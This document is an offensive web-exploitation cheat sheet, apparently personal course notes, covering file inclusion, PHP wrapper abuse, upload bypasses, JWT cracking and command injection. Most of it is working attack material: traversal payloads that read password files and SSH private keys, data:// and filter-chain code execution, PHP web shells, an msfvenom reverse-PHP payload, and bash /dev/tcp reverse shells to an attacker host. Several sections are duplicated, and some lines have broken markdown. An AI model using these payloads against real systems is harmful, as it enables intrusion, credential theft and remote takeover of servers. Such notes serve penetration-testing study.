# File Inclusion Uploads and Git Exposure

File read/write abuse, LFI/RFI, wrapper abuse, upload bypasses, web shells, and exposed Git data.
Keep traversal probes and upload tradecraft together because many real paths blend both classes during exploitation.

## Common Files for Testing

- **Linux:** `/etc/passwd`, `/home/user/.ssh/id_rsa` and id_ecdsa and id_dsa
- **Windows:** `C:\Windows\System32\drivers\etc\hosts` (readable by all local users, uses backslashes `\`, so `..\` is `..\\`)

## IIS Specific Information

If the target uses IIS, check:

- Log paths: `C:\inetpub\logs\LogFiles\W3SVC1\`
- Web root configuration: `C:\inetpub\wwwroot\web.config` (may contain sensitive data)

## Example LFI Payloads

```bash
curl [http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
bash
curl [http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa

id_ecdsa

id_dsa
```

> **Post-Exploitation (SSH with retrieved key):**

```bash
chmod 400 key
ssh -i key -p 2222 user@<IP>
```

## git - enumerate in parent directory of `.git`

```git
git log

git show <commit#>

git init
```

## Specific Vulnerabilities

- **CVE-2021-43798 (Grafana):**

```bash
curl --path-as-is http://localhost:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
```

- **Apache 2.4.49 LFI:**

```bash
curl http://192.168.50.16/cgi-bin/../../../../etc/passwd
```

## LFI to RCE

```shell
# lfi2rce
https://github.com/0bfxgh0st/lfi2rce

OR Manually

xyz1.php?cmd=<ANY COMMAND YOU WANT>&xyz2=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php
```

## Obfuscating Directory Traversal Payloads

```bash
%2e%2e/   # represents ../ (Linux)
%2e%2e%2f   # represents ../ (Linux)
..%2f     # represents ../ (Linux)
%2e%2e%5c   # represents ..\ (Windows)
%2e%2e\\   # represents ..\ (Windows)
..%5c     # represents ..\ (Windows)
%252e%252e%255c # represents ..\ (Windows)
..%255c   # represents ..\ (Windows)
```

## PHP Wrappers for LFI

- `file://` - Accessing local filesystem
- `http://` - Accessing HTTP(s) URLs
- `ftp://` - Accessing FTP(s) URLs
- `php://` - Accessing various I/O streams (e.g., show file contents)
```bash
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
```
 - **Base64 Encoding (if filtered):**
```bash
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php

echo "<base64output>" | base64 -d
```
- `zlib://` - Compression Streams
- `data://` - Data (RFC 2397) - Can achieve code execution
```bash
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```
- **Base64 Encoding Shell Commands (if `system` or `cmd` are filtered):**
```bash
echo -n '<?php echo system($_GET["cmd"]);?>' | base64

curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```
- `glob://` - Find pathnames matching pattern
- `phar://` - PHP Archive
- `ssh2://` - Secure Shell 2
- `rar://` - RAR
- `ogg://` - Audio streams
- `expect://` - Process Interaction Streams

## HTTP Request Analysis

- Analyze HTTP POST and GET requests.
- Inspect the webpage using browser developer tools (Debugger, Inspector, Network tabs).

## `curl` for `robots.txt` and `sitemap.xml`

```bash
curl https://www.google.com/robots.txt

curl https://www.google.com/sitemap.xml
```

## `curl` for API Interaction (Example: Changing Admin Password)

```bash
curl \
'http://192.168.50.16:5002/users/v1/admin/password' \
-H 'Content-Type: application/json' \
-H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
-d '{"password": "pwned"}'
```

> **Note:** This example shows a PUT request to change an admin password using a JWT token obtained previously.

```bash
curl -X 'PUT' \
'http://192.168.50.16:5002/users/v1/admin/password' \
-H 'Content-Type: application/json' \
-H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
-d '{"password": "pwned"}'
```

Crack JWT token / JWT hash
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```

## `feroxbuster`

```bash
feroxbuster -k -u http://192.168.180.100:7742/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 403,404,400,503,301 -x php,html,htm,asp,aspx,jsp,txt,bak,zip,tar.gz,old,inc,conf,config,log,db,json -t 200

# consider lower or higher -t (min 30, max 500)
```

## `dirsearch`

```bash
dirsearch dir -u http://<ip>:<port> -w /path/to/wordlist.txt
```

## Other Tools

- Dirbuster
- ffuf
```bash
ffuf -w /path/to/wordlist -u http://<IP>/FUZZ
```
- whatweb
- etc.

## Minification and Encoding

Use tools like [https://jscompress.com/](https://jscompress.com/) to minify JavaScript.

```JavaScript
function encode_to_javascript(string) {
  var input = string;
  var output = '';
  for (pos = 0; pos < input.length; pos++) {
    output += input.charCodeAt(pos);
    if (pos != (input.length - 1)) {
      output += ",";
    }
  }
  return output;
}
let encoded = encode_to_javascript('insert_minified_javascript');
console.log(encoded);
JavaScript
function encode_to_javascript(string) {
  var input = string;
  var output = '';
  for (pos = 0; pos < input.length; pos++) {
    output += input.charCodeAt(pos);
    if (pos != (input.length - 1)) {
      output += ",";
    }
  }
  return output;
}

let encoded = encode_to_javascript('insert_minified_javascript');
console.log(encoded);
```

## LFI

```
127.0.0.1:8000/backend/?view=../../../../../etc/passwd
127.0.0.1:8000/backend/?view=../../../../../var/crash/test.php&cmd=id
```

## File upload

```
$ cat .htaccess
AddType application/x-httpd-php .evil

$ cat simple-backdoor.evil
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>

http://192.168.204.187/uploads/simple-backdoor.evil?cmd=whoami
```
💡 If we can upload a webshell and access it in /uploads - GG! - Can be used with combo with directory traversal / LFI - abuse the upload path in Burp to put it in /var and then access it like here \[[http://240.0.0.1:8000/backend/?view=../../../../../../../../etc/passwd](http://240.0.0.1:8000/backend/?view=../../../../../../../../etc/passwd) [http://240.0.0.1:8000/backend/?view=../../../../../../../../var/cmd.php&cmd=whoami\](Cheat%20sheet%20b2ec1956b01746ed807a1363890b898f.md)](http://240.0.0.1:8000/backend/?view=../../../../../../../../var/cmd.php&cmd=whoami]\(Cheat%20sheet%20b2ec1956b01746ed807a1363890b898f.md\)) 💡 Non executable - Could try to overwrite ssh keys: In burp: filename=../../../../../../../root/.ssh/authorized\_keys 💡 Good place to upload webshells: C:\\xampp\\htdocs\\html-php-backdoor.php We can check this path via phpinfo.php on DOCUMENT\_ROOT \`curl [http://192.168.120.132:45332/phpinfo.php](http://192.168.120.132:45332/phpinfo.php) | grep 'DOCUMENT\_ROOT' | html2text\`💡 If we have something that looks like a direct command on the os - We can try to abuse it with URL encoded ‘;’ / ‘&&’ / ‘&’. Example from course:

curl -X POST --data 'Archive=git%3Bipconfig' [http://192.168.50.189:8000/archive](http://192.168.50.189:8000/archive)

## Web Shells

```
<?php system($_GET['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo system($_REQUEST['shell']): ?>
```

---

## LFI

[File Inclusion/Path traversal | HackTricks | HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

```
http://240.0.0.1:8000/backend/?view=../../../../../../../../etc/passwd
<inject the php webshell to /var!!!>
http://240.0.0.1:8000/backend/?view=../../../../../../../../var/cmd.php&cmd=whoami
```
```
?page=../../../../../../../Windows/System32/drivers/etc/hosts
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers/Viewer/.ssh/id_rsa
```
```
http://192.168.223.229/index.php?file=home.php # (if no need for .php -> only can include php files!)
http://192.168.223.229/index.php?file=php://filter/convert.base64-encode/resource=upload.php
http://192.168.223.229/index.php?file=php://filter/convert.base64-encode/resource=/etc/passwd

# zip wrapper for RCE
http://192.168.223.229/index.php?file=zip://uploads/upload_1719432517.zip%23simple-backdoor.php&cmd=whoami
http://192.168.223.229/index.php?file=zip://uploads/upload_1719432517.zip%23simple-backdoor&cmd=whoami
```
💡 If we can’t include some interesting files (uploads) / View the content via filter / Steal id\_rsa.. TRY RFI!

## RFI

```
msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=9001 -o shell.php
?page=http://192.168.45.200/payload/shell.php
?page=http://192.168.45.200/php/php_reverse_shell.php
```

when we can inject a remote path, especially \\kali\_ip\\test (smb directory) we can use responder to get the ntlm or ntlmx relay to relay it.

💡 If we cannot crack the NetNTLMv2 hash we still can try to \[Relaying Net-NTLMv2\]([https://www.notion.so/Relaying-Net-NTLMv2-55e13d96ef574f60a44c3ea618334087?pvs=21](https://www.notion.so/Relaying-Net-NTLMv2-55e13d96ef574f60a44c3ea618334087?pvs=21)). In the course they showed that if admin02 is connected on files01 we can relay the NetNTLMv2 through our Kali to files02 and gain a shell on files02.

## File upload

```
$ cat .htaccess
AddType application/x-httpd-php .evil

$ cat simple-backdoor.evil
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>

http://192.168.204.187/uploads/simple-backdoor.evil?cmd=whoami
```

💡 If we can upload a webshell and access it in /uploads - GG! - Can be used with combo with directory traversal / LFI - abuse the upload path in Burp to put it in /var and then access it like here [[http://240.0.0.1:8000/backend/?view=../../../../../../../../etc/passwd](http://240.0.0.1:8000/backend/?view=../../../../../../../../etc/passwd) [http://240.0.0.1:8000/backend/?view=../../../../../../../../var/cmd.php&cmd=whoami\](Cheat%20sheet%20b2ec1956b01746ed807a1363890b898f.md)](http://240.0.0.1:8000/backend/?view=../../../../../../../../var/cmd.php&cmd=whoami]\(Cheat%20sheet%20b2ec1956b01746ed807a1363890b898f.md\))
💡 Non executable - Could try to overwrite ssh keys: In burp:

`filename=../../../../../../../root/.ssh/authorized\_keys `

💡 Good place to upload webshells: `C:\\xampp\\htdocs\\html-php-backdoor.php `We can check this path via `phpinfo.php` on

`DOCUMENT\_ROOT \`curl [http://192.168.120.132:45332/phpinfo.php](http://192.168.120.132:45332/phpinfo.php) | grep 'DOCUMENT\_ROOT' | html2text\`

💡 If we have something that looks like a direct command on the os - We can try to abuse it with URL encoded ‘;’ / ‘&&’ / ‘&’. Example from course:

`curl -X POST --data 'Archive=git%3Bipconfig'` [http://192.168.50.189:8000/archive](http://192.168.50.189:8000/archive)

- If web shell just shows source code:
	- The server didn't render the shell at all due to the unknown extension.
	- It can be noticed that the server running on the machine is apache.
	- So we could potentially upload a ".htaccess" file to the directory to let the server render my ".xxx" extension as PHP script. John Hammond has a [video](https://www.youtube.com/watch?v=xZd1JWmLGLk) to explain it well.
	- We have to make our own `.htaccess` file
```shell
echo "AddType application/x-httpd-php .xxx" > .htaccess
```
- After we upload that file, upload webshell with `.xxx` extension and it will take it

## Null Byte

```
%00
0x00
```
```
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
```

## php://filter Wrapper

> [https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb](https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb)

> [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

> [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter)

```
url=php://filter/convert.base64-encode/resource=file:////var/www/<RHOST>/api.php
```
```
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
base64 -d <FILE>.php
```
```
Accept: ../../../../.././../../../../etc/passwd{{
Accept: ../../../../.././../../../../etc/passwd{%0D
Accept: ../../../../.././../../../../etc/passwd{%0A
Accept: ../../../../.././../../../../etc/passwd{%00
Accept: ../../../../.././../../../../etc/passwd{%0D{{
Accept: ../../../../.././../../../../etc/passwd{%0A{{
Accept: ../../../../.././../../../../etc/passwd{%00{{
```

---

```
%PDF-1.4

<?php
    system($_GET["cmd"]);
?>
```
```
http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
```
```
.sh
.cgi
.inc
.txt
.pht
.phtml
.phP
.Php
.php3
.php4
.php5
.php7
.pht
.phps
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.jpeg
```
```
<FILE>.php%20
<FILE>.php%0d%0a.jpg
<FILE>.php%0a
<FILE>.php.jpg
<FILE>.php%00.gif
<FILE>.php\x00.gif
<FILE>.php%00.png
<FILE>.php\x00.png
<FILE>.php%00.jpg
<FILE>.php\x00.jpg
mv <FILE>.jpg <FILE>.php\x00.jpg
```

> [https://github.com/synacktiv/php\_filter\_chain\_generator](https://github.com/synacktiv/php_filter_chain_generator)

```
python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
python3 php_filter_chain_generator.py --chain "<?php echo shell_exec(id); ?>"
python3 php_filter_chain_generator.py --chain """<?php echo shell_exec(id); ?>"""
python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
```
```
http://<RHOST>/?page=php://filter/convert.base64-decode/resource=PD9waHAgZWNobyBzaGVsbF9leGVjKGlkKTsgPz4
```
```
python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
[+] The following gadget chain will generate the following code : <?= exec($_GET[0]); ?> (base64 value: PD89IGV4ZWMoJF9HRVRbMF0pOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|<--- SNIP --->|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=<COMMAND>
```
```
python3 php_filter_chain_generator.py --chain "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'); ?>" | grep "^php" > <FILE>
```
```
curl "http://<RHOST>/index.php?file=$(cat <FILE>)"
```
```
phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/<FILE>.txt /PATH/TO/FILE/<FILE>.txt
```
```
https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
```
